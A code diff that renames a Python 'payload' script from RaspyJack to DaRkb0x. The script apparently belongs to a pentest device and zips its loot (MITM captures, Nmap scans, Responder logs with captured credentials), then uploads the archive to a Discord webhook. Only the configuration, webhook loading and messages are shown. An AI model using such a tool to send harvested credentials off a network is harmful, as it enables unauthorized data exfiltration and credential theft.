@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack *payload* – **Upload Loot to Discord**
+DaRkb0x *payload* – **Upload Loot to Discord**
 ================================================
 This script gathers:
 
@@ -17,9 +17,9 @@ It follows the same « heavily commented & beginner‑friendly » style as
 Usage
 -----
 
-1.  Put this file in RaspyJack’s *payloads/* directory.
+1.  Put this file in DaRkb0x’s *payloads/* directory.
 2.  Edit the ``WEBHOOK_URL`` constant below so it contains **your own** Discord webhook URL.
-3.  Run it manually **or** add it to RaspyJack’s menu just like the other payloads.
+3.  Run it manually **or** add it to DaRkb0x’s menu just like the other payloads.
 
 Discord limits a single upload to **≤ 8 MiB** for standard (non Nitro) accounts.  The script will warn you if the archive is larger.
 """
@@ -44,16 +44,16 @@ except ModuleNotFoundError as exc:
 # 2) Configuration – tweak these paths if your layout differs
 # ---------------------------------------------------------------------------
 # (Paths are **relative** to the folder where you launch the script.)
-LOOT_DIR       = Path("/root/Raspyjack/loot")
+LOOT_DIR       = Path("/root/DaRkb0x/loot")
 MITM_DIR       = LOOT_DIR / "MITM"
 NMAP_DIR       = LOOT_DIR / "Nmap"
-RESPONDER_DIR  = Path("/root/Raspyjack/Responder") / "logs"
+RESPONDER_DIR  = Path("/root/DaRkb0x/Responder") / "logs"
 
-WEBHOOK_FILE = Path("/root/Raspyjack/discord_webhook.txt")
+WEBHOOK_FILE = Path("/root/DaRkb0x/discord_webhook.txt")
 
 
 def _load_webhook_url():
-    """Load webhook URL from system config (shared with raspyjack.py)."""
+    """Load webhook URL from system config (shared with darkbox.py)."""
     try:
         if WEBHOOK_FILE.exists():
             for line in WEBHOOK_FILE.read_text().splitlines():
@@ -81,7 +81,7 @@ def cleanup(*_):
     print("\n[INFO] Interruption received – cleaning up…")
 
 signal.signal(signal.SIGINT,  cleanup)   # Ctrl‑C
-signal.signal(signal.SIGTERM, cleanup)   # kill or RaspyJack quit
+signal.signal(signal.SIGTERM, cleanup)   # kill or DaRkb0x quit
 
 # ---------------------------------------------------------------------------
 # 4) Helper: recursively add a directory to a ZIP archive
@@ -152,8 +152,8 @@ def main() -> None:
     if not WEBHOOK_URL or "xxxxxxxx" in WEBHOOK_URL:
         print(textwrap.dedent("""\
             [ERROR] No Discord webhook configured!
-            Add your webhook URL to /root/Raspyjack/discord_webhook.txt
-            (same file used by RaspyJack main menu)."""))
+            Add your webhook URL to /root/DaRkb0x/discord_webhook.txt
+            (same file used by DaRkb0x main menu)."""))
         sys.exit(1)
 
     print("[INFO] Building archive …", end=" ")
